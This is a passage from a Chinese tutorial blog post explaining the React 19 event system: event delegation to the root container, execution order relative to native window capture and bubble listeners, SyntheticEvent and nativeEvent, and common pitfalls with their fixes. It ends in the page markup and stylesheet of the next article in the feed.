<li><strong>原生 window 事件</strong>：就是通过 window.addEventListener 绑定的事件（如 resize、scroll、click 等），是浏览器原生支持的事件，遵循原生 DOM 事件流（捕获→目标→冒泡）。</li>
</ul>
<h3 data-id="heading-6">1. 两者的核心关联：事件流的先后顺序</h3>
<p>React UI 事件的执行依赖于根容器的原生事件捕获，而根容器是 window 下的一个 DOM 节点。因此，React UI 事件的执行顺序，必然处于原生事件流的“冒泡阶段”（因为事件要先冒泡到根容器，才能被 React 的统一处理函数捕获）。</p>
<p>我们用“原生事件流+React 事件流”的组合流程图，梳理两者的先后关系：</p>
<h3 data-id="heading-7">2. 代码验证：React 事件与 window 事件的顺序</h3>
<p>我们用代码验证上述流程，给 window 绑定捕获和冒泡阶段的 click 事件：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useEffect, useRef } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">EventWithWindowDemo</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> btnRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// React 事件</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'React 事件：onClick 触发'</span>);
  };

  <span class="hljs-comment">// 原生事件（目标元素）</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> btn = btnRef.<span class="hljs-property">current</span>;
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleBtnNative</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'目标元素原生事件：冒泡阶段 触发'</span>);
    };
    btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleBtnNative);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> btn.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleBtnNative);
  }, []);

  <span class="hljs-comment">// window 原生事件（捕获阶段）</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleWindowCapture</span> = (<span class="hljs-params">e</span>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'window 原生事件：捕获阶段 触发'</span>);
    };
    <span class="hljs-comment">// 第三个参数为 true，表示在捕获阶段执行</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleWindowCapture, <span class="hljs-literal">true</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleWindowCapture, <span class="hljs-literal">true</span>);
  }, []);

  <span class="hljs-comment">// window 原生事件（冒泡阶段）</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleWindowBubble</span> = (<span class="hljs-params">e</span>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'window 原生事件：冒泡阶段 触发'</span>);
    };
    <span class="hljs-comment">// 第三个参数省略或为 false，表示在冒泡阶段执行</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleWindowBubble);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleWindowBubble);
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{btnRef}</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleReactClick}</span>&gt;</span>
      点击测试（含 window 事件）
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
}
</code></pre>
<p>点击按钮后，控制台输出顺序如下，完全符合我们梳理的流程：</p>
<ol>
<li>window 原生事件：捕获阶段 触发（原生捕获阶段从 window 开始）</li>
<li>目标元素原生事件：冒泡阶段 触发（原生目标阶段）</li>
<li>React 事件：onClick 触发（事件冒泡到根容器，被 React 捕获执行）</li>
<li>window 原生事件：冒泡阶段 触发（事件最终冒泡到 window）</li>
</ol>
<h3 data-id="heading-8">3. 关键结论：React 事件是原生事件的“子集”与“延迟执行”</h3>
<p>从上述流程和代码可以得出核心结论：</p>
<ul>
<li>React 事件并非脱离原生事件存在，而是<strong>基于原生事件实现的封装</strong>——React UI 事件的执行，依赖于原生事件冒泡到根容器的过程；</li>
<li>React 事件的执行时机<strong>晚于目标元素及祖先元素的原生事件</strong>（因为要等事件冒泡到根容器），但<strong>早于 window 上的原生冒泡事件</strong>；</li>
<li>window 上的原生捕获事件，会在整个事件流的最开始执行，甚至早于目标元素的原生事件。</li>
</ul>
<h2 data-id="heading-9">四、核心原理 3：合成事件（SyntheticEvent）与原生事件对象的关系</h2>
<p>除了执行顺序，React 事件对象（SyntheticEvent）与原生事件对象也存在差异。在 React 事件处理函数中，我们拿到的 event 不是原生的 Event 对象，而是 React 封装的 SyntheticEvent 对象。</p>
<h3 data-id="heading-10">1. 合成事件的核心作用</h3>
<p>React 封装 SyntheticEvent 的核心目的是：</p>
<ul>
<li><strong>跨浏览器兼容</strong>：不同浏览器的原生事件对象存在差异（如 IE 的 event.srcElement vs 标准的 event.target），SyntheticEvent 统一了这些差异，让开发者无需关注浏览器兼容；</li>
<li><strong>事件对象池复用</strong>：React 会复用 SyntheticEvent 对象（减少内存开销），事件处理函数执行完后，会清空对象的属性（如 event.target、event.preventDefault() 等）；</li>
<li><strong>统一的事件 API</strong>：SyntheticEvent 提供了与原生事件对象相似的 API（如 preventDefault、stopPropagation），但行为有细微差异。</li>
</ul>
<h3 data-id="heading-11">2. 合成事件与原生事件对象的关联</h3>
<p>SyntheticEvent 对象内部持有原生事件对象的引用，可通过 <code>event.nativeEvent</code> 获取原生事件对象。例如：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params">event</span>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">SyntheticEvent</span>); <span class="hljs-comment">// true</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">nativeEvent</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Event</span>); <span class="hljs-comment">// true（原生事件对象）</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">target</span> === event.<span class="hljs-property">nativeEvent</span>.<span class="hljs-property">target</span>); <span class="hljs-comment">// true（统一目标元素）</span>
};
</code></pre>
<h3 data-id="heading-12">3. 注意点：合成事件的事件阻止</h3>
<p>在 React 事件中，调用 <code>event.stopPropagation()</code> 只能阻止 React 事件的“模拟冒泡”（即阻止父组件的 React 事件执行），但<strong>无法阻止原生事件的冒泡</strong>；如果要阻止原生事件冒泡，需要调用原生事件对象的 <code>stopPropagation()</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params">event</span>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素 React 事件触发'</span>);
  <span class="hljs-comment">// 阻止 React 事件的模拟冒泡（父组件的 React 事件不会执行）</span>
  event.<span class="hljs-title function_">stopPropagation</span>();
  <span class="hljs-comment">// 阻止原生事件的冒泡（父元素的原生事件、window 事件不会执行）</span>
  event.<span class="hljs-property">nativeEvent</span>.<span class="hljs-title function_">stopPropagation</span>();
};
</code></pre>
<p>注意：在 React 17 之前，合成事件的事件池复用机制会导致“异步访问事件属性失效”（如在 setTimeout 中访问 event.target 会是 null），需要用 event.persist() 保留事件属性；React 17 及之后（包括 React 19），移除了事件池复用机制，异步访问事件属性也能正常获取。</p>
<h2 data-id="heading-13">五、实战避坑：React 事件与原生事件协同的常见问题</h2>
<p>理解了上述原理后，我们就能解决实际开发中 React 事件与原生事件协同的常见问题了。下面列举 3 个高频问题及解决方案：</p>
<h3 data-id="heading-14">问题 1：React 事件与原生事件冒泡冲突，导致重复执行</h3>
<p>场景：父组件用 React 事件，子组件用原生事件，点击子组件时，父组件的 React 事件和子组件的原生事件都执行，不符合预期。</p>
<p>解决方案：在子组件的原生事件中，调用原生事件对象的 stopPropagation()，阻止事件冒泡到根容器，从而阻止 React 事件执行：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> btn = btnRef.<span class="hljs-property">current</span>;
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleNativeClick</span> = (<span class="hljs-params">e</span>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'子元素原生事件触发'</span>);
    e.<span class="hljs-title function_">stopPropagation</span>(); <span class="hljs-comment">// 阻止原生事件冒泡，React 事件不会执行</span>
  };
  btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> btn.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleNativeClick);
}, []);
</code></pre>
<h3 data-id="heading-15">问题 2：window 事件未移除，导致内存泄漏</h3>
<p>场景：在组件中绑定 window 原生事件（如 resize、scroll），组件卸载后，事件未移除，导致内存泄漏。</p>
<p>解决方案：在 useEffect 的清理函数中，移除 window 事件绑定：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleWindowResize</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'窗口大小变化'</span>);
  };
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, handleWindowResize);
  <span class="hljs-comment">// 组件卸载时移除事件</span>
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, handleWindowResize);
  };
}, []);
</code></pre>
<h3 data-id="heading-16">问题 3：React 事件中异步访问事件属性失效（React 17 之前）</h3>
<p>场景：在 React 17 及之前版本中，在 setTimeout 中访问 event.target 会是 null。</p>
<p>解决方案：调用 event.persist() 保留事件属性，或提前保存需要的属性：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 方案 1：调用 event.persist()</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params">event</span>) =&gt; {
  event.<span class="hljs-title function_">persist</span>(); <span class="hljs-comment">// 保留事件属性</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event.<span class="hljs-property">target</span>); <span class="hljs-comment">// 正常获取</span>
  }, <span class="hljs-number">1000</span>);
};

<span class="hljs-comment">// 方案 2：提前保存属性</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleReactClick</span> = (<span class="hljs-params">event</span>) =&gt; {
  <span class="hljs-keyword">const</span> target = event.<span class="hljs-property">target</span>; <span class="hljs-comment">// 提前保存</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(target); <span class="hljs-comment">// 正常获取</span>
  }, <span class="hljs-number">1000</span>);
};
</code></pre>
<p>注意：React 17 及之后版本（包括 React 19）已移除事件池复用机制，无需调用 event.persist()，异步访问事件属性也能正常获取。</p>
<h2 data-id="heading-17">六、核心总结</h2>
<p>今天我们从案例出发，拆解了 React 19 事件系统的核心原理，重点厘清了 React UI 事件与原生 window 事件的关系，最后给出了实战避坑方案。核心要点总结如下：</p>
<ol>
<li><strong>React 事件的核心是事件代理</strong>：所有 UI 事件委托给根容器（#root），通过事件注册表查找并执行处理函数，其“冒泡”是模拟的；</li>
<li><strong>React 事件与原生事件的顺序</strong>：window 原生捕获事件 → 目标元素/祖先元素原生事件 → React 事件 → window 原生冒泡事件；</li>
<li><strong>合成事件是原生事件的封装</strong>：提供跨浏览器兼容和统一 API，可通过 event.nativeEvent 获取原生事件对象；</li>
<li><strong>实战避坑关键</strong>：阻止原生冒泡需调用 event.nativeEvent.stopPropagation()；window 事件需在组件卸载时移除；React 17 之前异步访问事件属性需用 event.persist()。</li>
</ol>
<h2 data-id="heading-18">七、下一步学习方向</h2>
<p>掌握了 React 事件系统的核心原理后，下一步可以重点学习：</p>
<ul>
<li>React 19 事件系统的新特性：如对原生事件的进一步优化、与并发渲染的协同等；</li>
<li>事件性能优化：如防抖节流在 React 事件中的应用、避免不必要的事件绑定；</li>
<li>特殊事件场景：如表单事件（onSubmit、onChange）的特殊处理、拖拽事件与 React 事件的协同。</li>
</ul>
<p>如果这篇文章对你有帮助，欢迎点赞、收藏、转发～ 有任何问题也可以在评论区留言交流～ 我们下期再见！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端向架构突围系列 - 框架设计（六）：解析接口职责的单一与隔离]]></title>    <link>https://juejin.cn/post/7594391758427029514</link>    <guid>https://juejin.cn/post/7594391758427029514</guid>    <pubDate>2026-01-13T02:17:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594391758427029514" data-draft-id="7594389937459707914" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端向架构突围系列 - 框架设计（六）：解析接口职责的单一与隔离"/> <meta itemprop="keywords" content="前端,架构"/> <meta itemprop="datePublished" content="2026-01-13T02:17:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端王壮壮"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端向架构突围系列 - 框架设计（六）：解析接口职责的单一与隔离
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4473272506789485/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端王壮壮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:17:28.000Z" title="Tue Jan 13 2026 02:17:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body 